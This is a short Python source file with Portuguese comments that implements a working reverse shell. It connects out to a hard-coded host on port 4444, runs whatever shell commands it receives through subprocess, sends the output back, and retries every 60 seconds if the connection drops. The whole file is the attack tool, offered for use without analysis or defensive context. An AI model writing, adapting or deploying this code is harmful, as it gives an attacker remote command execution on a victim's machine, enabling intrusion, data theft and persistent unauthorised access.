import socket
from os import chdir, getcwd
import subprocess
from time import sleep


host = '192.168.99.2'                 #Seu servidor DNS.
port = 4444                            #Escolha uma porta que vc abriu em seu modem.

def criaSocket():
    s = socket.socket()
    conecta(s)

def conecta(s):
    try:
        s.connect((host, port))
        chdir('\\')                 #Muda o diretorio atual para a raiz
        recebeComandos(s)

    #Caso nao seja possivel conectar, espera 60 segundos e tenta conectar-se novamente
    except:
        sleep(60)
        conecta(s)


def recebeComandos(s):
    while True:
        try:
            cmd = s.recv(1024)

            #Comando para mudar o diretorio
            if cmd[:2] == 'cd':
                try:
                    chdir(cmd[3:])
                    diretorio = getcwd()
                    s.send(diretorio)
                except:
                    s.send("[-] Diretorio inexistente.")


            #Execucoes de comando shell
            else:
                proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE)
                resposta = proc.stdout.read() + proc.stderr.read()
                if len(resposta) > 0:
                    s.send(resposta)

                #Alguns comandos nao retornam nenhuma mensagem
                #Por exemplo, executar programas.
                #Logo, caso nao haja uma resposta, o servidor ira
                #ficar esperando infinitamente. :(
                else:
                    s.send("[+] Comando executado com sucesso.")

        #Caso algum erro ocorra ao receber o comando
        #a conexao deve ter sido perdida, logo
        #a shell ira ser reiniciada.
        except:
            s.close()
            criaSocket()



criaSocket()